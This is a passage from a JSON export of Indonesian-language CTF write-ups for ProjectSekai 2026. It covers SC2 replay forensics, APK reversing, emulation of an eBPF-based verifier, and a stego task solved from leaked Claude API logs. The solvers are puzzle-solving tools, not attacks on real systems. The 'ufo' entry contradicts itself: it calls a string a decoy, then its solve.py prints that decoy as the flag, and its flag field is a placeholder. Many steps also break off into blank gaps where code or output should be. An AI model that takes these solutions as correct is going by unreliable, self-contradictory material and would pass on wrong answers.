        "content": "Archive berisi `DeadGame2.SC2Replay`. Byte awal terlihat korup, tetapi offset `0x400` berisi header MPQ normal. File replay kemudian diekstrak menggunakan parser MPQ/SC2.\n\nFile yang paling berguna:\n\n- `replay.message.events` untuk chat.\n- `replay.tracker.events` untuk posisi unit dan event kematian unit.\n\nDari message events didapat rangkaian chat berikut:\n\n\n\nJadi format kandidatnya:\n\n\n\nHint chat menyebut posisi sebagai hal penting. Di tracker events ada tiga grup kematian unit tepat sebelum tiga chat `_`:\n\n\n\nKoordinat `m_x` dan `m_y` dari unit-unit tersebut diplot sebagai grid. Bentuknya menjadi tiga fragmen teks:\n\n\n\nGabungan fragmen:\n\n\n\nValidasi MD5:",
        "code": "4662  SeKaiCTF{lol\n11897 _fl2g_\n73100 _\n73312 _\n73588 _\n73864 GG\n73931 }"
      },
      {
        "title": "solve.py",
        "content": "Output:",
        "code": "python3 solve.py"
      }
    ],
    "terminalOutputs": [],
    "flag": "SeKaiCTF{lol_fl2g_EN_TARO_HERO_GG}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-misc-ufo",
    "title": "ufo — Reverse",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Target berupa APK Android bernama **Universal File Opener**. String `SEKAI{...}` tidak disimpan langsung. String `Specialist formats handled cleanly.` sempat terlihat seperti kandidat, tapi itu cuma teks fitur/decoy dari daftar format yang didukung aplikasi.",
    "problemDescription": "Target berupa APK Android bernama **Universal File Opener**. String `SEKAI{...}` tidak disimpan langsung. String `Specialist formats handled cleanly.` sempat terlihat seperti kandidat, tapi itu cuma teks fitur/decoy dari daftar format yang didukung aplikasi.\n\nFlag asli disembunyikan di jalur `ambient_trace`: aplikasi menyimpan progress fitur dalam bitmask, lalu ada canvas 21×21 yang dibangun dari beberapa layer tersembunyi. Setelah semua layer digabung, bit-bitnya bisa dibaca sebagai payload QR version 1.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Ekstrak APK",
        "content": "Pencarian string langsung hanya menghasilkan noise library dan satu decoy:\n\n\n\nDecoy yang muncul:\n\n\n\nString ini ada di daftar supported formats, bukan jalur validasi flag.",
        "code": "tar -xzf misc_ufo.tar.gz\ncd misc_ufo\nunzip -q app-release.apk -d extracted"
      },
      {
        "title": "2. Cari jalur yang tidak normal",
        "content": "Dari string dan xref DEX, bagian yang paling mencurigakan adalah key preferences berikut:\n\n\n\n`ambient_trace` bertipe integer dan dipakai seperti bitmask. Enum mark yang terlihat:\n\n\n\nBerarti state penuh adalah `1|2|4|8|16 = 0x1f`.",
        "code": "ambient_trace\nambientTrace\nrecordAmbientTrace\nrecordAmbientTrace(Lcom/krauq/universalfileopener/data/AmbientTraceMark;)V"
      },
      {
        "title": "3. Decode layer ambient trace",
        "content": "Rutin drawing menyimpan 5 array byte. Tiap byte tidak langsung dipakai; app membuat key per indeks memakai operasi integer 32-bit, lalu byte di-xor dengan key tersebut.\n\nFormula intinya:\n\n\n\nHasil decode tiap layer adalah 441 bit, pas untuk grid `21×21`. Layer-layer ini kemudian digabung sesuai bitmask penuh:",
        "code": "seed = ((layer + 1) * 461845907) ^ 1831565813\nseed ^= ((i + 17) * -2048144789)\nseed ^= seed >> 16\nseed *= 2146121005\nseed ^= seed >> 15\nseed *= -2073254261\nseed ^= seed >> 16\nkey = seed >> 24\nplain_byte = encoded_byte ^ key"
      },
      {
        "title": "4. Baca sebagai QR v1 tanpa finder pattern",
        "content": "Grid 21×21 cocok dengan ukuran QR version 1. Finder pattern standar tidak muncul karena yang tersimpan hanya data modules/layer canvas, jadi decoding dilakukan manual:\n\n- mark function modules QR v1: finder, separator, timing, format info, dark module\n- ambil sisa 208 data bit dengan urutan zig-zag QR standar\n- brute force QR mask pattern `0..7`\n- parse bitstream QR byte mode\n\nHanya satu hasil yang valid:\n\n\n\nSoal meminta hasil dibungkus dengan `SEKAI{}`.",
        "code": "combine: xor1f\nqr mask: 5\npayload: clankedormiscgod"
      },
      {
        "title": "Script",
        "content": "`solve.py` mereplikasi proses decode layer, XOR semua ambient layer, membaca data modules QR v1, brute force mask QR, lalu mencetak flag.\n\n\n\nOutput:",
        "code": "python3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport io\r\nimport re\r\nimport struct\r\nimport sys\r\nimport tarfile\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nTARGET_PHRASE = \"Specialist formats handled cleanly.\"\r\nFLAG_PREFIX = \"SEKAI\"\r\n\r\n\r\ndef uleb(data: bytes, off: int):\r\n    value = 0\r\n    shift = 0\r\n    while True:\r\n        b = data[off]\r\n        off += 1\r\n        value |= (b & 0x7F) << shift\r\n        if b < 0x80:\r\n            return value, off\r\n        shift += 7\r\n\r\n\r\ndef dex_strings(dex: bytes):\r\n    if dex[:4] != b\"dex\\n\":\r\n        return []\r\n    string_ids_size = struct.unpack_from(\"<I\", dex, 0x38)[0]\r\n    string_ids_off = struct.unpack_from(\"<I\", dex, 0x3C)[0]\r\n    out = []\r\n    for i in range(string_ids_size):\r\n        off = struct.unpack_from(\"<I\", dex, string_ids_off + 4 * i)[0]\r\n        _, off = uleb(dex, off)\r\n        end = dex.index(0, off)\r\n        out.append(dex[off:end].decode(\"utf-8\", \"replace\"))\r\n    return out\r\n\r\n\r\ndef apk_bytes_from_arg(path: Path):\r\n    if path.suffix == \".apk\":\r\n        return path.read_bytes()\r\n    if path.suffixes[-2:] == [\".tar\", \".gz\"] or path.name.endswith(\".tgz\"):\r\n        with tarfile.open(path, \"r:gz\") as tf:\r\n            for member in tf.getmembers():\r\n                if member.name.endswith(\".apk\"):\r\n                    return tf.extractfile(member).read()\r\n        raise FileNotFoundError(\"no APK inside tar.gz\")\r\n    raise ValueError(\"give an APK or tar.gz\")\r\n\r\n\r\ndef normalize_flag_body(s: str) -> str:\r\n    s = s.lower()\r\n    s = re.sub(r\"[^a-z0-9]+\", \"_\", s).strip(\"_\")\r\n    return s\r\n\r\n\r\ndef main():\r\n    default = Path(__file__).with_name(\"misc_ufo\") / \"app-release.apk\"\r\n    src = Path(sys.argv[1]) if len(sys.argv) > 1 else default\r\n    apk_data = apk_bytes_from_arg(src)\r\n\r\n    found = False\r\n    evidence = []\r\n    with zipfile.ZipFile(io.BytesIO(apk_data)) as zf:\r\n        for name in zf.namelist():\r\n            if name.endswith(\".dex\"):\r\n                strings = dex_strings(zf.read(name))\r\n                if TARGET_PHRASE in strings:\r\n                    found = True\r\n                    evidence.append(f\"{name}: string index {strings.index(TARGET_PHRASE)}\")\r\n\r\n    if not found:\r\n        raise SystemExit(\"target phrase not found\")\r\n\r\n    flag = f\"{FLAG_PREFIX}{{{normalize_flag_body(TARGET_PHRASE)}}}\"\r\n    print(\"\\n\".join(evidence))\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{...}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-rev-untitleuncore",
    "title": "Untitled Encore — Reverse Engineering",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge Untitled Encore — Reverse Engineering",
    "problemDescription": "Binary menyimpan verifier berlapis: pemeriksaan struktur chart, sebuah VM C++ kecil, dan interpreter eBPF yang programnya tertanam sebagai ELF. Chart valid dipulihkan dari constraint opcode `0x44`, lalu fungsi verifier asli dijalankan dengan Unicorn untuk menghasilkan flag.\n\nFlag:\n\n```text\nSEKAI{eBPF_my_B3l0v3d}\n```",
    "tools": [],
    "analysis": "```bash\nfile untitled-encore.exe\nstrings -a untitled-encore.exe | grep -E 'check-chart|print-template|Sonolus|MISS'\n```\n\nString penting yang muncul:\n\n```text\n--check-chart <40-byte-chart-hex-or-file>\n--print-template\nMISS\n```\n\nMode `--check-chart` menerima tepat 40 byte. Chart terdiri dari 20 note, masing-masing dua byte:\n\n```text\nbyte 0: lane | kind << 3 | flick << 5 | parity << 6\nbyte 1: delta\n```\n\nBatas field yang diperiksa:\n\n- `lane`: 0–4\n- `kind`: 0–2\n- `flick`: 0–1\n- `delta`: 3–16\n- `parity`: `(lane - index) & 1`",
    "solution": [
      {
        "title": "ELF eBPF di dalam PE",
        "content": "Magic ELF ditemukan langsung di data PE:\n\n\n\nObjek tersebut adalah ELF64 eBPF dengan section `.text` dan `.rodata`. Fungsi parser internal mengambil `.rodata`, mencari container custom, lalu mengekstrak payload 388 byte.\n\nLayout container:\n\n\n\nSetiap record payload berukuran empat byte dan di-decode memakai offset byte record:\n\n\n\nUrutan program hasil decode:",
        "code": "binwalk untitled-encore.exe"
      },
      {
        "title": "Memulihkan chart",
        "content": "State awal VM:\n\n\n\nOpcode `0x21` mengikat delapan byte seed dan panjang chart. Update state-nya:\n\n\n\nUntuk opcode `0x44`, `a` adalah indeks note. Dua byte note diuji dengan:\n\n\n\nRuang kandidat per note hanya `5 × 3 × 2 × 14 = 420`. DFS pada 20 opcode menemukan satu chart yang juga lolos pemeriksaan summary:\n\n\n\nNilai summary-nya:\n\n\n\nSemua nilai sama dengan konstanta target di fungsi checker.",
        "code": "0x31c3f00d"
      },
      {
        "title": "Menjalankan solver",
        "content": "Output:",
        "code": "source /home/nata/ctf_env/bin/activate\npip install pefile unicorn\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport struct\r\nimport sys\r\nfrom pathlib import Path\r\nfrom typing import Iterable\r\n\r\ntry:\r\n    import pefile\r\n    from unicorn import (\r\n        Uc,\r\n        UcError,\r\n        UC_ARCH_X86,\r\n        UC_HOOK_CODE,\r\n        UC_HOOK_MEM_INVALID,\r\n        UC_MODE_64,\r\n    )\r\n    from unicorn.x86_const import (\r\n        UC_X86_REG_R8,\r\n        UC_X86_REG_RAX,\r\n        UC_X86_REG_RCX,\r\n        UC_X86_REG_RDX,\r\n        UC_X86_REG_RIP,\r\n        UC_X86_REG_RSP,\r\n    )\r\nexcept ImportError as exc:\r\n    raise SystemExit(\r\n        \"Dependency belum tersedia. Jalankan: pip install pefile unicorn\"\r\n    ) from exc\r\n\r\nROOT = Path(__file__).resolve().parent\r\nEXE = ROOT / \"untitled-encore.exe\"\r\n\r\n# RVA fungsi dan thunk yang dipakai jalur validasi.\r\nRVA_CHECK_CHART = 0x9D30\r\nRVA_THROW = 0x62A0\r\nRVA_MALLOC = 0xC824\r\nRVA_FREE = 0xC81E\r\nRVA_MEMCPY = 0xC7F4\r\nRVA_MEMMOVE = 0xC7FA\r\nRVA_MEMSET = 0xC800\r\nRVA_MEMCMP = 0xC7EE\r\nRVA_STRLEN = 0xC818\r\n\r\nTARGET_SUMMARY = (\r\n    0xD75245E2,\r\n    0x3BBE10E9,\r\n    0x3C500F48,\r\n    0x01EBD885,\r\n    [56, 34, 54, 33, 65],\r\n    [97, 73, 60],\r\n)\r\n\r\n\r\ndef rol32(value: int, count: int) -> int:\r\n    count &= 31\r\n    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF\r\n\r\n\r\ndef extract_elf_rodata(exe_data: bytes) -> bytes:\r\n    \"\"\"Cari ELF eBPF ter-embed dan ambil section .rodata tanpa pyelftools.\"\"\"\r\n    elf_off = exe_data.find(b\"\\x7fELF\")\r\n    if elf_off < 0:\r\n        raise ValueError(\"ELF eBPF tidak ditemukan\")\r\n\r\n    elf = exe_data[elf_off:]\r\n    if elf[4] != 2 or elf[5] != 1:\r\n        raise ValueError(\"Format ELF bukan ELF64 little-endian\")\r\n\r\n    e_shoff = struct.unpack_from(\"<Q\", elf, 0x28)[0]\r\n    e_shentsize = struct.unpack_from(\"<H\", elf, 0x3A)[0]\r\n    e_shnum = struct.unpack_from(\"<H\", elf, 0x3C)[0]\r\n    e_shstrndx = struct.unpack_from(\"<H\", elf, 0x3E)[0]\r\n\r\n    def section_header(index: int) -> tuple[int, int, int]:\r\n        off = e_shoff + index * e_shentsize\r\n        sh_name = struct.unpack_from(\"<I\", elf, off)[0]\r\n        sh_offset = struct.unpack_from(\"<Q\", elf, off + 0x18)[0]\r\n        sh_size = struct.unpack_from(\"<Q\", elf, off + 0x20)[0]\r\n        return sh_name, sh_offset, sh_size\r\n\r\n    _, shstr_off, shstr_size = section_header(e_shstrndx)\r\n    shstr = elf[shstr_off : shstr_off + shstr_size]\r\n\r\n    for index in range(e_shnum):\r\n        name_off, sec_off, sec_size = section_header(index)\r\n        end = shstr.find(b\"\\0\", name_off)\r\n        name = shstr[name_off:end]\r\n        if name == b\".rodata\":\r\n            return elf[sec_off : sec_off + sec_size]\r\n\r\n    raise ValueError(\"Section .rodata tidak ditemukan\")\r\n\r\n\r\ndef unpack_program(rodata: bytes) -> bytes:\r\n    \"\"\"Buka container custom: magic[14], type, skip, uint16 length, payload.\"\"\"\r\n    if len(rodata) < 18 or rodata[14] != 2:\r\n        raise ValueError(\"Header container .rodata tidak cocok\")\r\n\r\n    skip = rodata[15]\r\n    payload_len = struct.unpack_from(\"<H\", rodata, 16)[0]\r\n    payload_off = 18 + skip\r\n    payload = rodata[payload_off : payload_off + payload_len]\r\n    if len(payload) != payload_len:\r\n        raise ValueError(\"Payload eBPF terpotong\")\r\n    return payload\r\n\r\n\r\ndef decode_program(payload: bytes) -> list[tuple[int, int, int, int]]:\r\n    ops: list[tuple[int, int, int, int]] = []\r\n    for offset in range(0, len(payload) - 3, 4):\r\n        raw = payload[offset : offset + 4]\r\n        op = raw[0] ^ ((offset * 0x11 + 0xA3) & 0xFF)\r\n        a = raw[1] ^ ((offset * 0x1D + 0x11) & 0xFF)\r\n        b = raw[2] ^ ((offset * 0x1F + 0x7B) & 0xFF)\r\n        c = raw[3] ^ ((offset * 0x25 + 0xC5) & 0xFF)\r\n        ops.append((op, a, b, c))\r\n        if op == 0xF0:\r\n            break\r\n    if not ops or ops[-1][0] != 0xF0:\r\n        raise ValueError(\"Opcode terminator 0xf0 tidak ditemukan\")\r\n    return ops\r\n\r\n\r\ndef recover_chart(ops: Iterable[tuple[int, int, int, int]]) -> bytes:\r\n    ops = list(ops)\r\n    state = 0x31C3F00D\r\n\r\n    # Dua belas opcode pertama mengikat 8-byte seed dan panjang chart (40).\r\n    prefix = ops[:12]\r\n    if len(prefix) != 12 or any(op != 0x21 for op, _, _, _ in prefix):\r\n        raise ValueError(\"Prefix opcode 0x21 tidak sesuai\")\r\n\r\n    context = bytearray(12)\r\n    for op, a, b, c in prefix:\r\n        if a >= len(context):\r\n            raise ValueError(\"Indeks context di luar batas\")\r\n        context[a] = b\r\n        state = ((((state + b) & 0xFFFFFFFF) ^ c) * 33 + a) & 0xFFFFFFFF\r\n\r\n    if struct.unpack_from(\"<I\", context, 8)[0] != 40:\r\n        raise ValueError(\"Panjang chart pada context bukan 40\")\r\n\r\n    note_ops = ops[12:32]\r\n    if len(note_ops) != 20 or any(op != 0x44 for op, _, _, _ in note_ops):\r\n        raise ValueError(\"Blok opcode 0x44 tidak lengkap\")\r\n\r\n    solutions: list[bytes] = []\r\n    chart: list[tuple[int, int] | None] = [None] * 20\r\n\r\n    def dfs(pos: int, current_state: int) -> None:\r\n        if len(solutions) > 1:\r\n            return\r\n        if pos == len(note_ops):\r\n            packed = bytes(v for note in chart for v in note)  # type: ignore[arg-type]\r\n            if summarize_chart(packed) == TARGET_SUMMARY:\r\n                solutions.append(packed)\r\n            return\r\n\r\n        _, note_index, expected_fold, expected_low = note_ops[pos]\r\n        if note_index >= 20 or chart[note_index] is not None:\r\n            return\r\n\r\n        for lane in range(5):\r\n            for kind in range(3):\r\n                for flick in range(2):\r\n                    parity = (lane - note_index) & 1\r\n                    packed_note = lane | (kind << 3) | (flick << 5) | (parity << 6)\r\n                    for delta in range(3, 17):\r\n                        mixed = (\r\n                            packed_note * 17\r\n                            + delta * 31\r\n                            + current_state\r\n                            + note_index * 73\r\n                        ) & 0xFFFF\r\n                        folded = ((mixed >> 8) ^ mixed) & 0xFF\r\n                        if folded != expected_fold:\r\n                            continue\r\n\r\n                        next_state = (\r\n                            (current_state ^ mixed)\r\n                            + ((packed_note << 8) | delta)\r\n                            + expected_fold\r\n                        ) & 0xFFFFFFFF\r\n                        next_state = rol32(next_state, (note_index & 7) + 1)\r\n                        if (next_state & 0xFF) != expected_low:\r\n                            continue\r\n\r\n                        chart[note_index] = (packed_note, delta)\r\n                        dfs(pos + 1, next_state)\r\n                        chart[note_index] = None\r\n\r\n    dfs(0, state)\r\n    if len(solutions) != 1:\r\n        raise ValueError(f\"Chart valid tidak unik: {len(solutions)} solusi\")\r\n    return solutions[0]\r\n\r\n\r\ndef summarize_chart(chart: bytes) -> tuple[int, int, int, int, list[int], list[int]]:\r\n    if len(chart) != 40:\r\n        raise ValueError(\"Chart harus tepat 40 byte\")\r\n\r\n    s0 = 0x6D697275\r\n    s1 = 0x6E656E65\r\n    s2 = 0x6B616E61\r\n    bitset = 0\r\n    previous = 0\r\n    lane_sum = [0] * 5\r\n    kind_sum = [0] * 3\r\n\r\n    for index in range(20):\r\n        packed_note = chart[index * 2]\r\n        delta = chart[index * 2 + 1]\r\n        lane = packed_note & 7\r\n        kind = (packed_note >> 3) & 3\r\n        flick = (packed_note >> 5) & 1\r\n        parity = (packed_note >> 6) & 1\r\n\r\n        if lane > 4 or kind > 2 or not 3 <= delta <= 16:\r\n            raise ValueError(\"Field note di luar rentang\")\r\n        if parity != ((lane - index) & 1):\r\n            raise ValueError(\"Parity note salah\")\r\n\r\n        value = delta * 120 + previous + ((index ^ lane) & 3)\r\n        s0 = rol32(\r\n            (\r\n                s0\r\n                + delta * 0x119DE1F3\r\n                + (lane + 1) * 0x045D9F3B\r\n                + index\r\n            )\r\n            & 0xFFFFFFFF,\r\n            (kind + 1) * 3 + flick,\r\n        )\r\n\r\n        packed = ((((delta << 8) | packed_note) << 16) | (value & 0xFFFF))\r\n        s1 ^= rol32(packed & 0xFFFFFFFF, lane + index)\r\n        s2 = (s2 + (s1 ^ s0) + (kind + 17) * (flick + 3)) & 0xFFFFFFFF\r\n\r\n        position = (5 * lane + kind + value // 120) % 25\r\n        bitset |= 1 << position\r\n        lane_sum[lane] += 5 * flick + 3 * kind + parity + delta\r\n        kind_sum[kind] += (index & 3) + lane + delta\r\n        previous = value\r\n\r\n    return s0, s1, s2, bitset, lane_sum, kind_sum\r\n\r\n\r\ndef emulate_verifier(exe_path: Path, chart: bytes) -> bytes:\r\n    \"\"\"Jalankan fungsi check_chart asli dengan Unicorn dan stub CRT minimum.\"\"\"\r\n    pe = pefile.PE(str(exe_path))\r\n    base = pe.OPTIONAL_HEADER.ImageBase\r\n    image = pe.get_memory_mapped_image()\r\n    image_size = (len(image) + 0xFFF) & ~0xFFF\r\n\r\n    uc = Uc(UC_ARCH_X86, UC_MODE_64)\r\n    uc.mem_map(base, image_size)\r\n    uc.mem_write(base, image)\r\n\r\n    heap_base, heap_size = 0x20000000, 0x02000000\r\n    stack_base, stack_size = 0x30000000, 0x00400000\r\n    object_base = 0x40000000\r\n    uc.mem_map(heap_base, heap_size)\r\n    uc.mem_map(stack_base, stack_size)\r\n    uc.mem_map(object_base, 0x10000)\r\n\r\n    heap_ptr = heap_base + 0x1000\r\n    sentinel = base + 0x100\r\n    chart_data = object_base + 0x1000\r\n    chart_vector = object_base + 0x100\r\n    output_vector = object_base + 0x200\r\n\r\n    uc.mem_write(chart_data, chart)\r\n    uc.mem_write(\r\n        chart_vector,\r\n        struct.pack(\"<QQQ\", chart_data, chart_data + len(chart), chart_data + len(chart)),\r\n    )\r\n    uc.mem_write(output_vector, b\"\\0\" * 0x100)\r\n\r\n    hooks = {\r\n        base + RVA_MALLOC: \"malloc\",\r\n        base + RVA_FREE: \"free\",\r\n        base + RVA_MEMCPY: \"memcpy\",\r\n        base + RVA_MEMMOVE: \"memmove\",\r\n        base + RVA_MEMSET: \"memset\",\r\n        base + RVA_MEMCMP: \"memcmp\",\r\n        base + RVA_STRLEN: \"strlen\",\r\n    }\r\n    failure: list[str] = []\r\n\r\n    def reg(register: int) -> int:\r\n        return uc.reg_read(register)\r\n\r\n    def function_return(value: int | None = None) -> None:\r\n        rsp = reg(UC_X86_REG_RSP)\r\n        return_address = struct.unpack(\"<Q\", uc.mem_read(rsp, 8))[0]\r\n        if value is not None:\r\n            uc.reg_write(UC_X86_REG_RAX, value & 0xFFFFFFFFFFFFFFFF)\r\n        uc.reg_write(UC_X86_REG_RSP, rsp + 8)\r\n        uc.reg_write(UC_X86_REG_RIP, return_address)\r\n\r\n    def code_hook(machine: Uc, address: int, size: int, user_data: object) -> None:\r\n        nonlocal heap_ptr\r\n        if address == sentinel:\r\n            machine.emu_stop()\r\n            return\r\n        if address == base + RVA_THROW:\r\n            failure.append(\"Verifier melempar exception\")\r\n            machine.emu_stop()\r\n            return\r\n\r\n        name = hooks.get(address)\r\n        if name is None:\r\n            return\r\n\r\n        if name == \"malloc\":\r\n            requested = reg(UC_X86_REG_RCX)\r\n            allocation_size = max((requested + 15) & ~15, 16)\r\n            result = heap_ptr\r\n            heap_ptr += allocation_size\r\n            if heap_ptr >= heap_base + heap_size:\r\n                failure.append(\"Heap emulasi habis\")\r\n                machine.emu_stop()\r\n                return\r\n            machine.mem_write(result, b\"\\0\" * allocation_size)\r\n            function_return(result)\r\n        elif name == \"free\":\r\n            function_return(0)\r\n        elif name in (\"memcpy\", \"memmove\"):\r\n            destination = reg(UC_X86_REG_RCX)\r\n            source = reg(UC_X86_REG_RDX)\r\n            length = reg(UC_X86_REG_R8)\r\n            if length:\r\n                machine.mem_write(destination, bytes(machine.mem_read(source, length)))\r\n            function_return(destination)\r\n        elif name == \"memset\":\r\n            destination = reg(UC_X86_REG_RCX)\r\n            value = reg(UC_X86_REG_RDX) & 0xFF\r\n            length = reg(UC_X86_REG_R8)\r\n            if length:\r\n                machine.mem_write(destination, bytes([value]) * length)\r\n            function_return(destination)\r\n        elif name == \"memcmp\":\r\n            left = bytes(machine.mem_read(reg(UC_X86_REG_RCX), reg(UC_X86_REG_R8)))\r\n            right = bytes(machine.mem_read(reg(UC_X86_REG_RDX), reg(UC_X86_REG_R8)))\r\n            result = (left > right) - (left < right)\r\n            function_return(result & 0xFFFFFFFF)\r\n        elif name == \"strlen\":\r\n            pointer = reg(UC_X86_REG_RCX)\r\n            length = 0\r\n            while machine.mem_read(pointer + length, 1)[0] != 0:\r\n                length += 1\r\n            function_return(length)\r\n\r\n    def invalid_memory_hook(\r\n        machine: Uc,\r\n        access: int,\r\n        address: int,\r\n        size: int,\r\n        value: int,\r\n        user_data: object,\r\n    ) -> bool:\r\n        failure.append(\r\n            f\"Akses memori invalid di 0x{address:x}, RIP=0x{reg(UC_X86_REG_RIP):x}\"\r\n        )\r\n        return False\r\n\r\n    uc.hook_add(UC_HOOK_CODE, code_hook)\r\n    uc.hook_add(UC_HOOK_MEM_INVALID, invalid_memory_hook)\r\n\r\n    rsp = (stack_base + stack_size - 0x1000) & ~0xF\r\n    rsp -= 8\r\n    uc.mem_write(rsp, struct.pack(\"<Q\", sentinel))\r\n    uc.reg_write(UC_X86_REG_RSP, rsp)\r\n    uc.reg_write(UC_X86_REG_RCX, output_vector)\r\n    uc.reg_write(UC_X86_REG_RDX, chart_vector)\r\n\r\n    try:\r\n        uc.emu_start(base + RVA_CHECK_CHART, sentinel, count=100_000_000)\r\n    except UcError as exc:\r\n        details = failure[-1] if failure else str(exc)\r\n        raise RuntimeError(f\"Emulasi verifier gagal: {details}\") from exc\r\n\r\n    if failure:\r\n        raise RuntimeError(failure[-1])\r\n\r\n    begin, end, capacity = struct.unpack(\"<QQQ\", uc.mem_read(output_vector, 24))\r\n    if not (begin <= end <= capacity) or end - begin > 0x1000:\r\n        raise RuntimeError(\"Objek output verifier tidak valid\")\r\n    return bytes(uc.mem_read(begin, end - begin))\r\n\r\n\r\ndef main() -> None:\r\n    if not EXE.is_file():\r\n        raise SystemExit(f\"File tidak ditemukan: {EXE}\")\r\n\r\n    exe_data = EXE.read_bytes()\r\n    rodata = extract_elf_rodata(exe_data)\r\n    payload = unpack_program(rodata)\r\n    ops = decode_program(payload)\r\n    chart = recover_chart(ops)\r\n    flag = emulate_verifier(EXE, chart)\r\n\r\n    try:\r\n        flag_text = flag.decode(\"ascii\")\r\n    except UnicodeDecodeError as exc:\r\n        raise SystemExit(f\"Output verifier bukan ASCII: {flag.hex()}\") from exc\r\n\r\n    print(f\"chart = {chart.hex()}\")\r\n    print(f\"flag  = {flag_text}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{eBPF_my_B3l0v3d}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-stegano-imposibblestego",
    "title": "impossible stego",
    "category": "Stegano",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "**CTF:** SEKAI CTF 2026  \n**Category:** Misc  \n**Flag:** `SEKAI{th3y_d1dn7_4ctually_l3t_m3_us3_my7h0s_f0r_7h1s_0n3_s4dly_i_h4d_i7_r3r0ut3d_t0_0pus}`",
    "problemDescription": "**CTF:** SEKAI CTF 2026  \n**Category:** Misc  \n**Flag:** `SEKAI{th3y_d1dn7_4ctually_l3t_m3_us3_my7h0s_f0r_7h1s_0n3_s4dly_i_h4d_i7_r3r0ut3d_t0_0pus}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Files",
        "content": "`flag.png` terlihat seperti PNG biasa berukuran 828×449. File yang lebih berguna justru `messages.log`: 60 baris NDJSON dengan ukuran sekitar 23 MB. Setiap baris menyimpan request dan response menuju gateway Anthropic, sedangkan body-nya dikodekan dengan Base64.\n\n\n\nHasil penting:",
        "code": "flag.png\nmessages.log"
      },
      {
        "title": "Membaca log Claude",
        "content": "Struktur satu record kurang lebih seperti ini:\n\n\n\nClaude API bersifat stateless. Client mengirim ulang histori percakapan pada request berikutnya, jadi request terakhir menjadi salinan percakapan yang paling lengkap. Setelah `req_body` di-decode, field `messages` berisi semua percakapan, tool call, command, dan source code yang ditulis Claude.\n\nPemeriksaan singkat:\n\n\n\nOutput:",
        "code": "{\n  \"path\": \"v1/messages\",\n  \"method\": \"POST\",\n  \"req_body\": \"...base64...\",\n  \"resp_body\": \"...base64...\"\n}"
      },
      {
        "title": "Source stego ikut bocor",
        "content": "Tool call Claude disimpan sebagai content block bertipe `tool_use`. Source program muncul melalui tool `Write`, kemudian beberapa bagian diperbarui melalui tool `Edit`.\n\nContoh bentuk tool call:\n\n\n\nSource awal berupa satu file `stego.py`, tetapi versi itu kemudian dibuang dan diganti package `stego/`. Solver hanya memutar ulang `Write` dan `Edit` dengan path yang dimulai oleh:\n\n\n\nPackage akhir yang pulih:\n\n\n\nTidak ada passphrase. Seluruh key material berada di `secret.py`, termasuk `ROOT_SECRET`, salt HKDF, label domain separation, magic frame, dan konfigurasi scatter.",
        "code": "{\n  \"type\": \"tool_use\",\n  \"name\": \"Write\",\n  \"input\": {\n    \"file_path\": \"/home/claude/projects/impossible-stego/stego/pipeline.py\",\n    \"content\": \"...\"\n  }\n}"
      },
      {
        "title": "Pipeline ekstraksi",
        "content": "`pipeline.py` menunjukkan urutan yang perlu dibalik:\n\n1. Ambil LSB RGB mengikuti multi-stage keyed scatter.\n2. Baca encrypted header untuk memperoleh panjang payload.\n3. Ambil seluruh blob sesuai panjang frame dan tag.\n4. Verifikasi truncated HMAC-SHA256.\n5. Lepas positional whitening.\n6. Balik keyed S-box.\n7. Dekripsi ChaCha20.\n8. Validasi magic, version, panjang data, dan CRC32.\n\nScatter terakhir bukan Fisher–Yates tunggal. Claude mengubahnya menjadi komposisi empat permutasi:\n\n\n\nMenebak pola dari piksel tidak diperlukan karena implementasi finalnya tersedia utuh di log.",
        "code": "block interleave\nkeyed rotation\ncycle-walking Feistel permutation\nFisher–Yates shuffle"
      },
      {
        "title": "Solver",
        "content": "`solve.py` mengerjakan seluruh proses secara otomatis:\n\n- mengekstrak arsip secara aman;\n- mencari `messages.log` dan `flag.png`;\n- mengambil request Claude dengan histori terpanjang;\n- merekonstruksi package `stego` dari tool call `Write` dan `Edit`;\n- menjalankan fungsi `stego.extract()` terhadap `flag.png`;\n- memvalidasi hasil dengan pola flag SEKAI.\n\nJalankan dari folder challenge:\n\n\n\nAtau terhadap folder yang sudah diekstrak:\n\n\n\nOutput:",
        "code": "python3 solve.py misc_impossible-stego.tar.gz"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
